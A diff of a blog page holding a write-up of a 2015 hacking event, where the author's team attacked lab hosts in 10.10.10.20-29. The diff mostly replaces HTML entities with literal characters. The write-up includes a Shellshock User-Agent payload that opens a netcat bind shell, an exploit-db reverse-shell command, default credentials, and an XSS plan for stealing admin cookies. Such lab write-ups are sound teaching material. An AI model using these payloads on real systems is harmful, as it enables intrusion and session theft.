@@ -1733,7 +1733,7 @@ blog.dornea.nu            </a>
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>Do you remember this <a href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/">usd AG hacker challenge write-up</a>? This years <a href="https://www.usd.de/akademie_/hackertag/">hacking event</a> organized by the same company took place in <strong>Hamburg</strong>. 9 hackers all over Germany were invited to pwn&amp;0wn all the things. Every team was assigned a certain IP range that had to be pentested. Every host identified within the IP range was <strong>rootable</strong>. And that&#39;s pretty much the information we had before conducting the pentest. My team got the IP range <strong>10.10.10.20-29</strong>. And now let&#39;s have a look at my notes I&#39;ve taken during the hacking session.</p>
+<p>Do you remember this <a href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions/">usd AG hacker challenge write-up</a>? This years <a href="https://www.usd.de/akademie_/hackertag/">hacking event</a> organized by the same company took place in <strong>Hamburg</strong>. 9 hackers all over Germany were invited to pwn&amp;0wn all the things. Every team was assigned a certain IP range that had to be pentested. Every host identified within the IP range was <strong>rootable</strong>. And that's pretty much the information we had before conducting the pentest. My team got the IP range <strong>10.10.10.20-29</strong>. And now let's have a look at my notes I've taken during the hacking session.</p>
 </div>
 </div>
 </div>
@@ -1742,11 +1742,10 @@ blog.dornea.nu            </a>
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h2 id="Targets">Targets<a class="anchor-link" href="#Targets">&#182;</a></h2>
+<h2 id="Targets">Targets<a class="anchor-link" href="#Targets">¶</a></h2>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
@@ -1763,11 +1762,10 @@ blog.dornea.nu            </a>
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h3 id="10.10.10.20">10.10.10.20<a class="anchor-link" href="#10.10.10.20">&#182;</a></h3>
+<h3 id="10.10.10.20">10.10.10.20<a class="anchor-link" href="#10.10.10.20">¶</a></h3>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
@@ -1784,7 +1782,7 @@ PORT    STATE SERVICE VERSION
 |   2048 c3:d5:b8:52:a9:3b:a7:79:83:2a:21:4f:81:4f:3f:d9 (RSA)
 |_  256 d0:9e:0d:5c:c8:14:46:e5:10:c4:d9:85:12:33:37:0d (ECDSA)
 80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
-|_http-title: Site doesn&#39;t have a title (text/html).
+|_http-title: Site doesn't have a title (text/html).
 111/tcp open  rpcbind 2-4 (RPC #100000)
 | rpcinfo: 
 |   program version   port/proto  service
@@ -1817,7 +1815,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre><p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
-
 <ul>
 <li>Old version of Apache</li>
 <li>Strange ports open: 47289/tcp, 52014/udp</li>
@@ -1830,7 +1827,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p><br/>
 <strong>Solutions</strong>:</p>
 <hr/>
-
 <ul>
 <li>Login to machine per SSH using <strong>user:user</strong></li>
 <li>Use a vulnerability in <a href="http://en.wikipedia.org/wiki/Restricted_shell">rbash</a> (restricted bash) in order to run a normal <em>bash</em></li>
@@ -1845,11 +1841,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h3 id="10.10.10.21">10.10.10.21<a class="anchor-link" href="#10.10.10.21">&#182;</a></h3>
+<h3 id="10.10.10.21">10.10.10.21<a class="anchor-link" href="#10.10.10.21">¶</a></h3>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
@@ -1882,8 +1877,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 + The anti-clickjacking X-Frame-Options header is not present.
 + Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
 + Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
-+ OSVDB-397: HTTP method (&#39;Allow&#39; Header): &#39;PUT&#39; method could allow clients to save files on the web server.
-+ OSVDB-5646: HTTP method (&#39;Allow&#39; Header): &#39;DELETE&#39; may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
 + /examples/servlets/index.html: Apache Tomcat default JSP pages present.
 + Cookie JSESSIONID created without the httponly flag
 + OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
@@ -1896,7 +1891,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre><p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
-
 <ul>
 <li>Old version of SSH server</li>
 <li>Old version of Apache server running Apache Tomcat</li>
@@ -1906,12 +1900,11 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 <p><br/>
 <strong>Solutions</strong>:</p>
 <hr/>
-
 <ul>
 <li>Login to Axis2 admin area using <strong>admin:axis2</strong> (default password)</li>
 <li>Upload a vulnerable service to Axis2 using <strong>metasploit</strong> (exploit/multi/http/axis2_deployer)</li>
 <li>Fire a new <strong>shell</strong> (as user <strong>tomcat</strong>) </li>
-<li>Have a look at <strong>/etc/passwd</strong> and notice that <strong>user</strong> is a &quot;Debian Live User&quot;</li>
+<li>Have a look at <strong>/etc/passwd</strong> and notice that <strong>user</strong> is a "Debian Live User"</li>
 <li>Google for Debians live user default password (=live)</li>
 <li>Login using <strong>user:live</strong></li>
 <li>sudo su --&gt; root</li>
@@ -1924,11 +1917,10 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h3 id="10.10.10.22">10.10.10.22<a class="anchor-link" href="#10.10.10.22">&#182;</a></h3>
+<h3 id="10.10.10.22">10.10.10.22<a class="anchor-link" href="#10.10.10.22">¶</a></h3>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
@@ -1946,7 +1938,7 @@ PORT     STATE SERVICE VERSION
 80/tcp   open  http    Apache httpd 2.2.3 ((CentOS))
 | http-methods: Potentially risky methods: TRACE
 |_See http://nmap.org/nsedoc/scripts/http-methods.html
-|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 111/tcp  open  rpcbind 2 (RPC #100000)
 | rpcinfo: 
 |   program version   port/proto  service
@@ -1977,7 +1969,6 @@ PORT     STATE SERVICE VERSION
 </code></pre><p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
-
 <ul>
 <li>Old version of SSH server</li>
 <li>Old version of Apache server running</li>
@@ -1986,10 +1977,9 @@ PORT     STATE SERVICE VERSION
 <p><br/>
 <strong>Solutions</strong>:</p>
 <hr/>
-
 <ul>
-<li><p>Looking at the web application we&#39;ve found this:</p>
-<pre><code>  $ curl -v &quot;http://10.10.10.22/cgi-bin/hello.sh?hacker&quot;
+<li><p>Looking at the web application we've found this:</p>
+<pre><code>  $ curl -v "http://10.10.10.22/cgi-bin/hello.sh?hacker"
   *   Trying 10.10.10.22...
   * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
   &gt; GET /cgi-bin/hello.sh?hacker HTTP/1.1
@@ -2008,7 +1998,7 @@ PORT     STATE SERVICE VERSION
   * Closing connection 0
 </code></pre></li>
 <li><p>Modifying the parameters lead to:</p>
-<pre><code>  $ curl -v &quot;http://10.10.10.22/cgi-bin/hello.sh?hacker;asdk;ping alkjsd&quot;
+<pre><code>  $ curl -v "http://10.10.10.22/cgi-bin/hello.sh?hacker;asdk;ping alkjsd"
   *   Trying 10.10.10.22...
   * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
   &gt; GET /cgi-bin/hello.sh?hacker;asdk;ping alkjsd HTTP/1.1
@@ -2027,13 +2017,13 @@ PORT     STATE SERVICE VERSION
   * Closing connection 0
 </code></pre></li>
 <li><p>Apache, cgi-bin, hello.sh ... That looked like a potential <strong>shellshock</strong> attack:</p>
-<pre><code>  $ curl -v -H "$(cat request)&quot; &quot;http://10.10.10.22/cgi-bin/hello.sh?hacker&quot;
+<pre><code>  $ curl -v -H "$(cat request)" "http://10.10.10.22/cgi-bin/hello.sh?hacker"
   *   Trying 10.10.10.22...
   * Connected to 10.10.10.22 (10.10.10.22) port 80 (#0)
   &gt; GET /cgi-bin/hello.sh?hacker HTTP/1.1
   &gt; Host: 10.10.10.22
   &gt; Accept: */*
-  &gt; User-Agent: () { :;}; /bin/bash -c &#39;nc -l -p 4445 -e /bin/bash &amp;&#39;
+  &gt; User-Agent: () { :;}; /bin/bash -c 'nc -l -p 4445 -e /bin/bash &amp;'
   &gt; 
   &lt; HTTP/1.1 500 Internal Server Error
   &lt; Date: Wed, 03 Jun 2015 15:57:10 GMT
@@ -2042,7 +2032,7 @@ PORT     STATE SERVICE VERSION
   &lt; Connection: close
   &lt; Content-Type: text/html; charset=iso-8859-1
   &lt; 
-  &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+  &lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
   &lt;html&gt;&lt;head&gt;
   &lt;title&gt;500 Internal Server Error&lt;/title&gt;
   &lt;/head&gt;&lt;body&gt;
@@ -2064,14 +2054,14 @@ PORT     STATE SERVICE VERSION
 <pre><code>  * run **netcat** and listen on port **4445**
   * when connecting to this port a new **bash** instance should be spawned
 </code></pre></li>
-<li><p>Unfortunately the manual way didn&#39;t work so we&#39;ve found this <a href="https://www.exploit-db.com/exploits/34900/">Apache mod_cgi - ShellshockRemote Exploit</a>:</p>
+<li><p>Unfortunately the manual way didn't work so we've found this <a href="https://www.exploit-db.com/exploits/34900/">Apache mod_cgi - ShellshockRemote Exploit</a>:</p>
 <pre><code>  $ wget https://www.exploit-db.com/download/34900 -o shellshock.py
   $ python2 shellshock.py payload=reverse rhost=10.10.10.22 \
       lhost=10.10.10.95 lport=4447 pages=http://10.10.10.22/cgi-bin/hello.sh
   ...
 </code></pre><p>  That will give you a reverse shell on port 4447.</p>
 </li>
-<li><p>Havin the shell access to the machine we&#39;ve stared investigating the permissions on the file system. We&#39;ve found out that current user (www-data I think) was able to read files inside <strong>/root</strong>. </p>
+<li><p>Havin the shell access to the machine we've stared investigating the permissions on the file system. We've found out that current user (www-data I think) was able to read files inside <strong>/root</strong>. </p>
 <pre><code>  10.10.10.22&gt; ls -l
       total 36
       -rw-r--r-- 1 root root 20396 May 18  2014 install.log
@@ -2091,11 +2081,10 @@ PORT     STATE SERVICE VERSION
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h3 id="10.10.10.23">10.10.10.23<a class="anchor-link" href="#10.10.10.23">&#182;</a></h3>
+<h3 id="10.10.10.23">10.10.10.23<a class="anchor-link" href="#10.10.10.23">¶</a></h3>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
@@ -2142,20 +2131,18 @@ Host script results:
 </code></pre><p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
-
 <ul>
-<li>It&#39;s a Windows box :D</li>
+<li>It's a Windows box :D</li>
 <li>A <strong>lot</strong> of services are exposed</li>
 <li>There is a <strong>smtpd</strong> running on port 25 (that might be interesting)</li>
 </ul>
 <p><br/>
 <strong>Solution</strong>:</p>
 <hr/>
-
 <ul>
 <li>Search in <strong>metasploit</strong> for <em>SLmail smtpd 5.5.0.4433</em></li>
 <li>Use found exploit to gain access to the machine</li>
-<li>And voila you&#39;re logged in as admin</li>
+<li>And voila you're logged in as admin</li>
 </ul>
 </div>
 </div>
@@ -2165,11 +2152,10 @@ Host script results:
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h3 id="10.10.10.24">10.10.10.24<a class="anchor-link" href="#10.10.10.24">&#182;</a></h3>
+<h3 id="10.10.10.24">10.10.10.24<a class="anchor-link" href="#10.10.10.24">¶</a></h3>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
@@ -2202,13 +2188,13 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
  + Server: Apache/2.2.16 (Debian)
  + Retrieved x-powered-by header: PHP/5.3.3-7+squeeze18
  + The anti-clickjacking X-Frame-Options header is not present.
- + OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is &quot;http://127.0.0.1/images/&quot;.
+ + OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".
  + Apache/2.2.16 appears to be outdated (current is at least Apache/2.2.22). Apache 1.3.42 (final release) and 2.0.64 are also current.
  + Server leaks inodes via ETags, header found with file /favicon.ico, inode: 6756, size: 14634, mtime: 0x4e1d6b3f0db40
  + DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
  + Cookie PHPSESSID created without the httponly flag
- + OSVDB-5034: /admin/login.php?action=insert&amp;username=test&amp;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user &#39;t
- est&#39; password &#39;test&#39; to verify.
+ + OSVDB-5034: /admin/login.php?action=insert&amp;username=test&amp;password=test: phpAuction may allow user admin accounts to be inserted without proper authentication. Attempt to log in with user 't
+ est' password 'test' to verify.
  + OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
  + OSVDB-3268: /icons/: Directory indexing found.
  + OSVDB-3268: /images/: Directory indexing found.
@@ -2220,19 +2206,17 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
 </code></pre><p><br/>
 <strong>Observations</strong>:</p>
 <hr/>
-
 <ul>
-<li>It&#39;s a <strong>blog</strong> system</li>
+<li>It's a <strong>blog</strong> system</li>
 <li>Authentification is done via session id (<code>=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000</code>)</li>
 <li>There is an <strong>admin area</strong> (/admin/login.php)</li>
 </ul>
 <p><br/>
 <strong>Solution</strong>:</p>
 <hr/>
-
 <ul>
 <li>Inside the comments section you can store a <strong>persistent XSS</strong></li>
-<li>There is a cronjob which &quot;visits&quot; the site logged in as <strong>admin</strong></li>
+<li>There is a cronjob which "visits" the site logged in as <strong>admin</strong></li>
 <li><p>The main idea was to <strong>steal</strong> admins <strong>sesssion</strong> using the XSS:</p>
 <ul>
 <li>Create XSS payload and send <code>document.cookie</code> to a box listening on a certain port</li>
@@ -2244,7 +2228,7 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
 </li>
 <li>Having read <code>/etc/passwd</code> you were to see which users were available on the box</li>
 <li>Log in as <strong>user:live</strong>  to the machine (per SSH)</li>
-<li>? (I can&#39;t remember the last step(s) xD)</li>
+<li>? (I can't remember the last step(s) xD)</li>
 </ul>
 </div>
 </div>
@@ -2254,18 +2238,17 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<h2 id="Conclusion">Conclusion<a class="anchor-link" href="#Conclusion">&#182;</a></h2>
+<h2 id="Conclusion">Conclusion<a class="anchor-link" href="#Conclusion">¶</a></h2>
 </div>
 </div>
 </div>
-
 <div class="cell border-box-sizing text_cell rendered">
 <div class="prompt input_prompt">
 </div>
 <div class="inner_cell">
 <div class="text_cell_render border-box-sizing rendered_html">
-<p>I&#39;d like to thank <a href="https://www.usd.de/">usd AG</a> for the organizational part and all participants for having a great time in Hamburg City. </p>
-<p><img src="http://dl.dornea.nu/img/2015/hackertag/4f41c02eeeb8fbee62da2751ffd913bc.jpg" width="99%"/></p>
+<p>I'd like to thank <a href="https://www.usd.de/">usd AG</a> for the organizational part and all participants for having a great time in Hamburg City. </p>
+<p><img class="img-responsive" src="http://dl.dornea.nu/img/2015/hackertag/4f41c02eeeb8fbee62da2751ffd913bc.jpg" width="99%"/></p>
 </div>
 </div>
 </div></p>
@@ -2275,9 +2258,9 @@ Nmap done: 10 IP addresses (5 hosts up) scanned in 66.17 seconds
     <h4>Related Posts:</h4>
     <ul>
         <li><a href="http://blog.dornea.nu/2015/03/18/usd-ag-hacker-challenge-2015-solutions">usd AG Hacker challenge 2015 - Solutions</a></li>
+        <li><a href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis">Disect Android APKs like a Pro - Static code analysis</a></li>
         <li><a href="http://blog.dornea.nu/2014/08/05/android-dynamic-code-analysis-mastering-droidbox">Android Dynamic Code Analysis - Mastering DroidBox</a></li>
         <li><a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump-ipython-notebook-version">24h Android sniffing using tcpdump - IPython Notebook Version</a></li>
-        <li><a href="http://blog.dornea.nu/2014/07/07/disect-android-apks-like-a-pro-static-code-analysis">Disect Android APKs like a Pro - Static code analysis</a></li>
         <li><a href="http://blog.dornea.nu/2014/01/23/24h-android-sniffing-using-tcpdump">24h Android sniffing using tcpdump</a></li>
     </ul>
 </section>
